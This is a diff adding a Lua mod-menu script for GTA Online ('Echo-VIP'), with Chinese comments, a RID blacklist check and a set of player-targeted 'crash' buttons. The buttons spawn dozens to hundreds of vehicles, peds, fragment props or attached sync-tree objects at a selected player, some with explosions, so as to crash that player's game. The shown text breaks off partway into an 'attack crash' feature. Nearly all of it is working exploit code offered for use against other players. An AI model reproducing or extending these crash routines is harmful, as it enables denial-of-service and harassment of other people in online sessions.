@@ -1,0 +1,2916 @@
+-- Echo-VIP 公益脚本
+-- 整合sjnb崩溃功能
+
+local function loadNatives()
+    if ENTITY and ENTITY.APPLY_FORCE_TO_ENTITY then return true end
+    local paths = {
+        FileMgr.GetMenuRootPath() .. "\\Lua\\EchoVIP\\natives.lua",
+        FileMgr.GetMenuRootPath() .. "\\Lua\\natives.lua",
+        FileMgr.GetMenuRootPath() .. "\\scripts\\natives.lua",
+    }
+    for _, p in ipairs(paths) do
+        if FileMgr.DoesFileExist(p) then pcall(dofile, p) end
+    end
+    return ENTITY ~= nil
+end
+loadNatives()
+
+-- ========== EchoVIP 验证系统 ==========
+-- 黑名单列表 (RID)
+local ECHOVIP_BLACKLIST = {}
+
+local function trim(s)
+    return (s and tostring(s):gsub("^%s+", ""):gsub("%s+$", "")) or ""
+end
+
+local function verifyPlayer()
+    -- 检查是否在线
+    if not NETWORK.NETWORK_IS_SESSION_ACTIVE() then
+        GUI.AddToast("EchoVIP - 离线模式", "请进入在线模式使用此脚本", 10000, eToastPos.TOP_RIGHT)
+        return false
+    end
+    
+    local playerIndex = PLAYER.PLAYER_ID()
+    if playerIndex == -1 then
+        GUI.AddToast("EchoVIP - 验证失败", "无法获取玩家ID", 10000, eToastPos.TOP_RIGHT)
+        return false
+    end
+    
+    local gamerHandle = Memory.Alloc(13 * 8)
+    NETWORK.NETWORK_HANDLE_FROM_PLAYER(playerIndex, gamerHandle, 13)
+    local memberId = NETWORK.NETWORK_MEMBER_ID_FROM_GAMER_HANDLE(gamerHandle)
+    Memory.Free(gamerHandle)
+    
+    memberId = trim(memberId)
+    if memberId == "" or memberId == "**Invalid**" then
+        GUI.AddToast("EchoVIP - 验证失败", "无法获取RID", 10000, eToastPos.TOP_RIGHT)
+        return false
+    end
+    
+    -- 检查黑名单
+    for i = 1, #ECHOVIP_BLACKLIST do
+        if trim(ECHOVIP_BLACKLIST[i]) == memberId then
+            GUI.AddToast("EchoVIP - 黑名单", "您已被禁止使用此脚本", 10000, eToastPos.TOP_RIGHT)
+            return false
+        end
+    end
+    
+    return true, playerIndex, memberId
+end
+
+-- ========== 初始化验证 ==========
+local ECHOVIP_VERIFIED, ECHOVIP_MY_INDEX, ECHOVIP_MY_RID = verifyPlayer()
+
+if not ECHOVIP_VERIFIED then
+    GUI.AddToast("EchoVIP - 验证失败", "脚本已禁用", 10000, eToastPos.TOP_RIGHT)
+    return
+end
+
+GUI.AddToast("EchoVIP - Fear Of Echo", "欢迎使用EchoVIP公益脚本\n作者：Z\n有问题进QQ群：1102465286反馈", 45000, eToastPos.TOP_RIGHT)
+-- ========== 验证系统结束 ==========
+
+-- ========== 辅助函数 ==========
+function networkRQ(ent)
+    local attempts = 0
+    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and attempts < 50 do
+        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
+        Script.Yield(10)
+        attempts = attempts + 1
+    end
+    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
+end
+
+function deleteEnt(ent)
+    if not ENTITY.DOES_ENTITY_EXIST(ent) then return end
+    local mem = Memory.AllocInt()
+    Memory.WriteInt(mem, ent)
+    ENTITY.DELETE_ENTITY(mem)
+    Memory.Free(mem)
+end
+
+function atan2(y, x)
+    if x > 0 then return math.atan(y / x)
+    elseif x < 0 then
+        if y >= 0 then return math.atan(y / x) + math.pi
+        else return math.atan(y / x) - math.pi end
+    elseif x == 0 then
+        if y > 0 then return math.pi / 2
+        elseif y < 0 then return -math.pi / 2
+        else return 0 end
+    end
+end
+
+-- ========== 公共碎片生成函数（完全复用原碎片崩溃逻辑） ==========
+local function SpawnFragmentsAtPlayer(playerId, count, allEntitiesTable)
+    local targetPed = Players.GetCPed(playerId)
+    if not targetPed then return {} end
+    local pos = targetPed.Position
+    local fragModel = Utils.Joaat("prop_fragtest_cnst_04")
+    
+    STREAMING.REQUEST_MODEL(fragModel)
+    local timeout = 0
+    while not STREAMING.HAS_MODEL_LOADED(fragModel) and timeout < 200 do
+        Script.Yield(15)
+        timeout = timeout + 1
+    end
+    if not STREAMING.HAS_MODEL_LOADED(fragModel) then return {} end
+    
+    local spawned = {}
+    for i = 1, count do
+        local obj = GTA.CreateObject(fragModel, pos.x + (math.random() - 0.5) * 3, pos.y + (math.random() - 0.5) * 3, pos.z + math.random(0, 3), true, true)
+        if obj and obj ~= 0 then
+            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(obj, true, true)
+            ENTITY.FREEZE_ENTITY_POSITION(obj, false)
+            ENTITY.APPLY_FORCE_TO_ENTITY(obj, 1, (math.random() - 0.5) * 10, (math.random() - 0.5) * 10, math.random(1, 5), 0, 0, 0, 1, true, true, true, true, true)
+            table.insert(spawned, obj)
+            if allEntitiesTable then
+                table.insert(allEntitiesTable, obj)
+            end
+        end
+        Script.Yield(10)
+    end
+    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(fragModel)
+    return spawned
+end
+
+-- ========== 原有碎片崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("FragmentCrash"),
+    "碎片崩溃",
+    eFeatureType.Button,
+    "生成30个碎片模型并施加力",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("碎片崩溃", "请先选择一个玩家", 2000); return end
+        Script.QueueJob(function()
+            SpawnFragmentsAtPlayer(playerId, 30, nil)
+            GUI.AddToast("碎片崩溃", "执行完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 碎片崩溃V2（连续5次碎片崩溃，5秒后自动清理） ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("FragmentCrashV2"),
+    "碎片崩溃V2",
+    eFeatureType.Button,
+    "连续执行5次碎片崩溃（每次30个碎片），5秒后自动清理所有碎片",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then
+            GUI.AddToast("碎片崩溃V2", "❌ 请先选择一个玩家", 2000)
+            return
+        end
+
+        Script.QueueJob(function()
+            GUI.AddToast("碎片崩溃V2", "🔄 开始执行5次碎片崩溃...", 2000, eToastPos.TOP_RIGHT)
+
+            local allFragments = {}   -- 存储所有生成的碎片实体
+
+            for i = 1, 5 do
+                local fragments = SpawnFragmentsAtPlayer(playerId, 30, allFragments)
+                GUI.AddToast("碎片崩溃V2", string.format("✅ 第 %d/5 次完成，生成 %d 个碎片", i, #fragments), 1000, eToastPos.TOP_RIGHT)
+                Script.Yield(100)  -- 短暂间隔，避免过度拥挤
+            end
+
+            GUI.AddToast("碎片崩溃V2", string.format("🎉 5次全部完成！共生成 %d 个碎片，5秒后自动清理", #allFragments), 3000, eToastPos.TOP_RIGHT)
+
+            -- 等待5秒后清理所有碎片
+            Script.Yield(5000)
+
+            GUI.AddToast("碎片崩溃V2", "🧹 开始清理所有碎片...", 1500, eToastPos.TOP_RIGHT)
+            for _, frag in ipairs(allFragments) do
+                if ENTITY.DOES_ENTITY_EXIST(frag) then
+                    deleteEnt(frag)
+                end
+                Script.Yield(2)
+            end
+            collectgarbage("collect")
+            GUI.AddToast("碎片崩溃V2", "✅ 清理完成", 2000, eToastPos.TOP_RIGHT)
+        end)
+    end,
+    true
+)
+
+-- ========== 同步树崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("SyncTreeCrash"),
+    "同步树崩溃",
+    eFeatureType.Button,
+    "发送同步树崩溃攻击",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("同步树崩溃", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then return end
+            
+            local pos = targetPed.Position
+            local objectHash = 1352295901
+            
+            STREAMING.REQUEST_MODEL(objectHash)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(objectHash) and timeout < 200 do
+                Script.Yield(10); timeout = timeout + 1
+            end
+            
+            if STREAMING.HAS_MODEL_LOADED(objectHash) then
+                local main_sync = GTA.CreateWorldObject(objectHash, pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                if main_sync then
+                    local sync_tree_children = {
+                        849958566, -568220328, 2155335200, 1272323782, 1296557055,
+                        29828513, 2250084685, 2349112599, 1599985244, 3523942264,
+                        3457195100, 3762929870, 1016189997, 861098586, 3613262246,
+                        3245733464, 2494305715, 671173206, 3769155529, 978689073,
+                        100436592, 3107991431, 1327834842, 1239708330
+                    }
+                    
+                    for i = 1, #sync_tree_children do
+                        STREAMING.REQUEST_MODEL(sync_tree_children[i])
+                        local ct = 0
+                        while not STREAMING.HAS_MODEL_LOADED(sync_tree_children[i]) and ct < 200 do
+                            Script.Yield(10); ct = ct + 1
+                        end
+                        if STREAMING.HAS_MODEL_LOADED(sync_tree_children[i]) then
+                            local child = GTA.CreateWorldObject(sync_tree_children[i], pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                            if child then
+                                Natives.InvokeVoid(0x6B9BBD38AB0796DF, child, main_sync, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
+                            end
+                        end
+                    end
+                    
+                    local time = Time.Get() + 2
+                    while time > Time.Get() do
+                        Script.Yield(math.random(0, 10))
+                        Natives.InvokeVoid(0x06843DA7060A026B, main_sync, pos.x + math.random(-1, 1), pos.y + math.random(-1, 1), pos.z + math.random(-1, 1), false, false, false, false)
+                    end
+                end
+            end
+            
+            GUI.AddToast("同步树崩溃", "执行完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 货机崩溃(5秒清理) ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("CargoplaneCrash5s"),
+    "货机崩溃",
+    eFeatureType.Button,
+    "生成100架货机，5秒后自动清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("货机崩溃", "请先选择一个玩家", 2000, eToastPos.BOTTOM_RIGHT); return end
+        
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then GUI.AddToast("货机崩溃", "无法获取目标玩家", 2000); return end
+            
+            local pos = targetPed.Position
+            local spawnZ = pos.z + 100.0
+            local vehicles = {}
+            
+            GUI.AddToast("货机崩溃", "开始生成100架货机...", 2000)
+            
+            for i = 1, 100 do
+                local spawnX = pos.x + (math.random() - 0.5) * 2.0
+                local spawnY = pos.y + (math.random() - 0.5) * 2.0
+                local veh = GTA.SpawnVehicle(0x15F27762, spawnX, spawnY, spawnZ, math.random(0, 360), true, false)
+                if veh and veh ~= 0 then
+                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(veh, true, true)
+                    ENTITY.FREEZE_ENTITY_POSITION(veh, true)
+                    VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, true)
+                    VEHICLE.SET_VEHICLE_LIGHTS(veh, 3)
+                    table.insert(vehicles, veh)
+                end
+                if i % 10 == 0 then Script.Yield(20) end
+            end
+            
+            GUI.AddToast("货机崩溃", string.format("已生成 %d 架货机，5秒后清理...", #vehicles), 2000)
+            Script.Yield(5000)
+            
+            GUI.AddToast("货机崩溃", "开始清理实体...", 1000)
+            for _, veh in ipairs(vehicles) do
+                Script.QueueJob(function()
+                    if veh and ENTITY.DOES_ENTITY_EXIST(veh) then deleteEnt(veh) end
+                end)
+            end
+            
+            GUI.AddToast("货机崩溃", "清理完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 飞行员崩溃 ==========
+local driverModel = Utils.Joaat("a_m_y_skater_01")
+
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("PilotCrash"),
+    "飞行员崩溃",
+    eFeatureType.Button,
+    "60架载具带飞行员，3秒后清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("飞行员崩溃", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then return end
+            local targetHandle = GTA.PointerToHandle(targetPed)
+            
+            local spawnX = targetPed.Position.x
+            local spawnY = targetPed.Position.y
+            local spawnZ = targetPed.Position.z + 100.0
+            local vehHash = 2336777441
+            
+            STREAMING.REQUEST_MODEL(vehHash)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(vehHash) and timeout < 100 do
+                Script.Yield(10); timeout = timeout + 1
+            end
+            if not STREAMING.HAS_MODEL_LOADED(vehHash) then return end
+            
+            STREAMING.REQUEST_MODEL(driverModel)
+            timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(driverModel) and timeout < 100 do
+                Script.Yield(10); timeout = timeout + 1
+            end
+            if not STREAMING.HAS_MODEL_LOADED(driverModel) then return end
+            
+            local vehicles, drivers = {}, {}
+            
+            for i = 1, 60 do
+                local veh = GTA.SpawnVehicle(vehHash, spawnX, spawnY, spawnZ, 0.0, true, false)
+                if veh and veh ~= 0 then
+                    networkRQ(veh)
+                    ENTITY.SET_ENTITY_COLLISION(veh, true, true)
+                    ENTITY.FREEZE_ENTITY_POSITION(veh, true)
+                    VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, false)
+                    for m = 0, 3 do VEHICLE.SET_VEHICLE_NEON_ENABLED(veh, m, true) end
+                    VEHICLE.SET_VEHICLE_LIGHTS(veh, 3)
+                    table.insert(vehicles, veh)
+                    
+                    local driver = GTA.CreatePed(driverModel, 26, spawnX, spawnY, spawnZ, 0.0, true, false)
+                    if driver and driver ~= 0 then
+                        PED.SET_PED_INTO_VEHICLE(driver, veh, -1)
+                        Natives.InvokeVoid(0x1E09C32048FEFD1C, driver, veh, targetHandle, 0.0, 0, 50.0, 100, 0)
+                        table.insert(drivers, driver)
+                    end
+                    
+                    FIRE.ADD_EXPLOSION(spawnX, spawnY, spawnZ, 29, 5.0, true, false, 1.0, false)
+                end
+                if i % 10 == 0 then Script.Yield(20) else Script.Yield(5) end
+            end
+            
+            GUI.AddToast("飞行员崩溃", string.format("已生成 %d 架载具，3秒后清理...", #vehicles), 2000)
+            Script.Yield(3000)
+            
+            GUI.AddToast("飞行员崩溃", "开始清理...", 1000)
+            for _, veh in ipairs(vehicles) do
+                Script.QueueJob(function() if veh and ENTITY.DOES_ENTITY_EXIST(veh) then deleteEnt(veh) end end)
+            end
+            for _, drv in ipairs(drivers) do
+                Script.QueueJob(function() if drv and ENTITY.DOES_ENTITY_EXIST(drv) then deleteEnt(drv) end end)
+            end
+            
+            GUI.AddToast("飞行员崩溃", "清理完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 车灯崩溃(90辆德罗索) ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("DeluxoCrash"),
+    "车灯崩溃",
+    eFeatureType.Button,
+    "90辆德罗索带车灯，15秒后清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("车灯崩溃", "请先选择一个玩家", 2000); return end
+        
+        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerId)
+        local vehHash = Utils.Joaat("deluxo")
+        
+        STREAMING.REQUEST_MODEL(vehHash)
+        while not STREAMING.HAS_MODEL_LOADED(vehHash) do Script.Yield(1) end
+        
+        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 0.0, 3.0, 0.0)
+        local playerHeading = ENTITY.GET_ENTITY_HEADING(playerPed)
+        local vehicleHeading = playerHeading + 180.0
+        local vehs, peds = {}, {}
+        
+        for i = 1, 90 do
+            local ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
+            peds[i] = ped
+            ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
+            
+            vehs[i] = GTA.SpawnVehicle(vehHash, pos.x, pos.y, pos.z, vehicleHeading, true, false)
+            if ENTITY.DOES_ENTITY_EXIST(vehs[i]) then
+                local netId = NETWORK.VEH_TO_NET(vehs[i])
+                if netId > 0 then
+                    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                end
+                networkRQ(vehs[i])
+                ENTITY.SET_ENTITY_COLLISION(vehs[i], false, true)
+                ENTITY.FREEZE_ENTITY_POSITION(vehs[i], true)
+                PED.SET_PED_INTO_VEHICLE(ped, vehs[i], -1)
+                ENTITY.SET_ENTITY_INVINCIBLE(vehs[i], true)
+                VEHICLE.SET_VEHICLE_ENGINE_ON(vehs[i], true, true, false)
+                for m = 0, 3 do VEHICLE.SET_VEHICLE_NEON_ENABLED(vehs[i], m, true) end
+                VEHICLE.SET_VEHICLE_LIGHTS(vehs[i], 3)
+            end
+            Script.Yield(120)
+        end
+        
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehHash)
+        Script.Yield(15000)
+        
+        for pass = 1, 3 do
+            for i = 1, #peds do
+                if ENTITY.DOES_ENTITY_EXIST(peds[i]) then networkRQ(peds[i]); deleteEnt(peds[i]) end
+            end
+            for i = 1, #vehs do
+                if ENTITY.DOES_ENTITY_EXIST(vehs[i]) then
+                    networkRQ(vehs[i])
+                    ENTITY.FREEZE_ENTITY_POSITION(vehs[i], false)
+                    deleteEnt(vehs[i])
+                end
+            end
+            Script.Yield(500)
+        end
+        
+        collectgarbage("collect")
+    end, true
+)
+
+-- ========== 火箭崩溃(136辆切尔诺伯格) ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("RocketCrash"),
+    "火箭崩溃",
+    eFeatureType.Button,
+    "136辆切尔诺伯格",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("火箭崩溃", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            local chernobogHash = -692292317
+            STREAMING.REQUEST_MODEL(chernobogHash)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(chernobogHash) and timeout < 200 do
+                Script.Yield(10); timeout = timeout + 1
+            end
+            
+            GUI.AddToast("火箭崩溃", "开始生成136辆...", 2000)
+            
+            for i = 1, 136 do
+                local targetPed = Players.GetCPed(playerId)
+                if not targetPed then break end
+                local targetPos = targetPed.Position
+                
+                local veh = GTA.SpawnVehicle(chernobogHash, targetPos.x, targetPos.y, targetPos.z + 5.0, math.random(0, 360), true, true)
+                if veh and veh ~= 0 then
+                    Natives.InvokeVoid(0x1C99BB7B6E96D16F, veh, 0, 0, -5000.0)
+                end
+                if i % 50 == 0 then Script.Yield(2) end
+            end
+            
+            local targetPed = Players.GetCPed(playerId)
+            if targetPed then
+                local targetPos = targetPed.Position
+                for i = 1, 20 do
+                    FIRE.ADD_EXPLOSION(targetPos.x + math.random(-10, 10), targetPos.y + math.random(-10, 10), targetPos.z + math.random(5, 15), 29, 300.0, true, false, 2.5, false)
+                    Script.Yield(30)
+                end
+            end
+            
+            GUI.AddToast("火箭崩溃", "执行完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 富豪崩(30辆桑托劳) ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("WealthCrash"),
+    "富豪崩溃",
+    eFeatureType.Button,
+    "30辆桑托劳",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("富豪崩溃", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then return end
+            local targetPos = targetPed.Position
+            
+            local modelHash = -1403128555
+            local spawnCount = 0
+            
+            for i = 1, 30 do
+                local veh = GTA.SpawnVehicle(modelHash, targetPos.x + math.random(-10, 10), targetPos.y + math.random(-10, 10), targetPos.z + 0.5, math.random(0, 360), true, true)
+                if veh and veh ~= 0 then spawnCount = spawnCount + 1 end
+                Script.Yield(50)
+            end
+            
+            GUI.AddToast("富豪崩溃", string.format("已生成 %d 辆", spawnCount), 2000)
+        end)
+    end, true
+)
+
+-- ========== Echo欧美崩溃（修改版） ==========
+local allEntities = {}
+local echoOm_drawing = false
+local echoOm_drawEndTime = 0
+
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("EchoOmCrash"),
+    "Echo欧美崩溃",
+    eFeatureType.Button,
+    "阿库拉+同步树+碎片，5秒后清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        if playerId == -1 then GUI.AddToast("Echo欧美崩溃", "请先选择一个玩家", 2000); return end
+        
+        Script.QueueJob(function()
+            -- 清理之前的实体
+            for _, ent in ipairs(allEntities) do
+                if ent and ENTITY.DOES_ENTITY_EXIST(ent) then deleteEnt(ent) end
+            end
+            allEntities = {}
+            
+            local targetPed = Players.GetCPed(playerId)
+            if not targetPed then GUI.AddToast("Echo欧美崩溃", "无法获取目标", 2000); return end
+            local pos = targetPed.Position
+            
+            -- 启动绘制文字（字体放大到7.0，文字改为"Fear Of 神迹"）
+            echoOm_drawing = true
+            echoOm_drawEndTime = Time.GetEpocheMs() + 5000
+            
+            local akulaHash = Utils.Joaat("akula")
+            
+            -- 1. 生成50架阿库拉直升机（圆形排列，围绕玩家一周）
+            GUI.AddToast("Echo欧美崩溃", "开始生成阿库拉（圆形排列）...", 2000)
+            STREAMING.REQUEST_MODEL(akulaHash)
+            local timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(akulaHash) and timeout < 200 do
+                Script.Yield(10); timeout = timeout + 1
+            end
+            
+            local akulaCount = 0
+            if STREAMING.HAS_MODEL_LOADED(akulaHash) then
+                local radius = 12.0  -- 圆形半径
+                for i = 1, 50 do
+                    local angle = (i / 50) * 360
+                    local rad = angle * (math.pi / 180)
+                    local spawnX = pos.x + radius * math.cos(rad)
+                    local spawnY = pos.y + radius * math.sin(rad)
+                    local spawnZ = pos.z + 5.0  -- 抬高5米
+                    local heading = angle       -- 朝向圆心
+                    
+                    local veh = GTA.SpawnVehicle(akulaHash, spawnX, spawnY, spawnZ, heading, true, false)
+                    if veh and veh ~= 0 then
+                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(veh, true, true)
+                        ENTITY.FREEZE_ENTITY_POSITION(veh, true)
+                        VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true, true)
+                        VEHICLE.SET_VEHICLE_LIGHTS(veh, 3)
+                        table.insert(allEntities, veh)
+                        akulaCount = akulaCount + 1
+                    end
+                    Script.Yield(20)
+                end
+                STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(akulaHash)
+                GUI.AddToast("Echo欧美崩溃", string.format("阿库拉: %d/50", akulaCount), 2000)
+            else
+                GUI.AddToast("Echo欧美崩溃", "阿库拉模型加载失败", 2000)
+            end
+            
+            -- 2. 进行5次同步树
+            GUI.AddToast("Echo欧美崩溃", "开始同步树攻击...", 2000)
+            local objectHash = 1352295901
+            STREAMING.REQUEST_MODEL(objectHash)
+            timeout = 0
+            while not STREAMING.HAS_MODEL_LOADED(objectHash) and timeout < 200 do
+                Script.Yield(10); timeout = timeout + 1
+            end
+            
+            local syncCount = 0
+            if STREAMING.HAS_MODEL_LOADED(objectHash) then
+                local sync_tree_children = {
+                    849958566, -568220328, 2155335200, 1272323782, 1296557055,
+                    29828513, 2250084685, 2349112599, 1599985244, 3523942264,
+                    3457195100, 3762929870, 1016189997, 861098586, 3613262246,
+                    3245733464, 2494305715, 671173206, 3769155529, 978689073,
+                    100436592, 3107991431, 1327834842, 1239708330
+                }
+                
+                for j = 1, 5 do
+                    local main_sync = GTA.CreateWorldObject(objectHash, pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                    if main_sync then
+                        table.insert(allEntities, main_sync)
+                        syncCount = syncCount + 1
+                        
+                        for k = 1, #sync_tree_children do
+                            STREAMING.REQUEST_MODEL(sync_tree_children[k])
+                            local ct = 0
+                            while not STREAMING.HAS_MODEL_LOADED(sync_tree_children[k]) and ct < 200 do
+                                Script.Yield(10); ct = ct + 1
+                            end
+                            if STREAMING.HAS_MODEL_LOADED(sync_tree_children[k]) then
+                                local child = GTA.CreateWorldObject(sync_tree_children[k], pos.x + 300, pos.y + 300, pos.z + 300, true, true)
+                                if child then
+                                    table.insert(allEntities, child)
+                                    Natives.InvokeVoid(0x6B9BBD38AB0796DF, child, main_sync, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, 2, true)
+                                end
+                            end
+                        end
+                    end
+                    Script.Yield(50)
+                end
+                GUI.AddToast("Echo欧美崩溃", string.format("同步树: %d/5", syncCount), 2000)
+            else
+                GUI.AddToast("Echo欧美崩溃", "同步树模型加载失败", 2000)
+            end
+            
+            -- 3. 生成50个碎片
+            GUI.AddToast("Echo欧美崩溃", "开始生成碎片...", 2000)
+            local fragments = SpawnFragmentsAtPlayer(playerId, 50, allEntities)
+            GUI.AddToast("Echo欧美崩溃", string.format("碎片: %d/50", #fragments), 2000)
+            
+            -- 4. 莱斯特功能已移除
+            
+            GUI.AddToast("Echo欧美崩溃", string.format("共生成 %d 个实体，5秒后清理...", #allEntities), 2000)
+            Script.Yield(5000)
+            
+            -- 清理所有实体
+            GUI.AddToast("Echo欧美崩溃", "开始清理实体...", 1000)
+            for _, ent in ipairs(allEntities) do
+                Script.QueueJob(function()
+                    if ent and ENTITY.DOES_ENTITY_EXIST(ent) then deleteEnt(ent) end
+                end)
+            end
+            allEntities = {}
+            
+            GUI.AddToast("Echo欧美崩溃", "清理完成", 2000)
+        end)
+    end, true
+)
+
+-- ========== 车灯崩溃V2 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("CarLightCrashV2"),
+    "车灯崩溃V2",
+    eFeatureType.Button,
+    "生成300辆Ruiner2，无碰撞，带有全车灯效果，15秒后清理",
+    function(f)
+        local playerId = f:GetPlayerIndex()
+        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerId)
+        local vehHash = Utils.Joaat("ruiner2")
+
+        STREAMING.REQUEST_MODEL(vehHash)
+        while not STREAMING.HAS_MODEL_LOADED(vehHash) do
+            Script.Yield(1)
+        end
+
+        local vehs = {}
+        local peds = {}
+
+        local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(playerPed, 0.0, 3.0, 0.0)
+        local playerHeading = ENTITY.GET_ENTITY_HEADING(playerPed)
+        local vehicleHeading = playerHeading + 180.0
+
+        for i = 1, 300 do
+            local ped = PED.CREATE_RANDOM_PED(pos.x, pos.y, pos.z)
+            peds[i] = ped
+            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
+            ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
+
+            vehs[i] = GTA.SpawnVehicle(vehHash, pos.x, pos.y, pos.z, vehicleHeading, true, false)
+
+            if ENTITY.DOES_ENTITY_EXIST(vehs[i]) then
+                local netId = NETWORK.VEH_TO_NET(vehs[i])
+                if netId > 0 then
+                    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false)
+                    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netId, true)
+                end
+                networkRQ(vehs[i])
+                ENTITY.SET_ENTITY_COLLISION(vehs[i], false, true)
+                ENTITY.FREEZE_ENTITY_POSITION(vehs[i], true)
+                PED.SET_PED_INTO_VEHICLE(ped, vehs[i], -1)
+                ENTITY.SET_ENTITY_INVINCIBLE(vehs[i], true)
+                VEHICLE.SET_VEHICLE_ENGINE_ON(vehs[i], true, true, false)
+                VEHICLE.SET_VEHICLE_KEEP_ENGINE_ON_WHEN_ABANDONED(vehs[i], true)
+
+                for m = 0, 3 do VEHICLE.SET_VEHICLE_NEON_ENABLED(vehs[i], m, true) end
+                VEHICLE.SET_AMBIENT_VEHICLE_NEON_ENABLED(vehs[i], true)
+                for n = 17, 22 do VEHICLE.TOGGLE_VEHICLE_MOD(vehs[i], n, true) end
+                VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vehs[i], 10)
+                VEHICLE.SET_VEHICLE_LIGHTS(vehs[i], 3)
+                VEHICLE.SET_VEHICLE_HEADLIGHT_SHADOWS(vehs[i], 3)
+                VEHICLE.SET_VEHICLE_INTERIORLIGHT(vehs[i], true)
+                VEHICLE.SET_VEHICLE_FORCE_INTERIORLIGHT(vehs[i], true)
+                Script.Yield(1)
+            end
+            Script.Yield(80)
+        end
+
+        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehHash)
+        GUI.AddToast("车灯崩溃V2", string.format("已生成 %d 辆", #vehs), 2000)
+
+        Script.Yield(15000)
+
+        for pass = 1, 3 do
+            for i = 1, #peds do
+                if ENTITY.DOES_ENTITY_EXIST(peds[i]) then
+                    networkRQ(peds[i])
+                    PED.SET_PED_INTO_VEHICLE(peds[i], 0, -1)
+                    deleteEnt(peds[i])
+                end
+            end
+            for i = 1, #vehs do
+                if ENTITY.DOES_ENTITY_EXIST(vehs[i]) then
+                    local netId = NETWORK.VEH_TO_NET(vehs[i])
+                    if netId > 0 then NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netId, false) end
+                    networkRQ(vehs[i])
+                    ENTITY.FREEZE_ENTITY_POSITION(vehs[i], false)
+                    for seat = -1, 0 do
+                        local pedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehs[i], seat, false)
+                        if ENTITY.DOES_ENTITY_EXIST(pedInSeat) then
+                            PED.SET_PED_INTO_VEHICLE(pedInSeat, 0, -1)
+                        end
+                    end
+                    deleteEnt(vehs[i])
+                    Script.Yield(5)
+                end
+            end
+            Script.Yield(500)
+        end
+        collectgarbage("collect")
+        GUI.AddToast("车灯崩溃V2", "清理完成", 2000)
+    end, true
+)
+
+-- ========== 攻击崩溃 ==========
+FeatureMgr.AddPlayerFeature(
+    Utils.Joaat("AttackCrash"),
+    "攻击崩溃",
+    eFeatureType.Button,
+    "生成攻击型NPC带武器攻击目标玩家",
+    function(f)
+        local playerId = f:GetPlayerIndex()
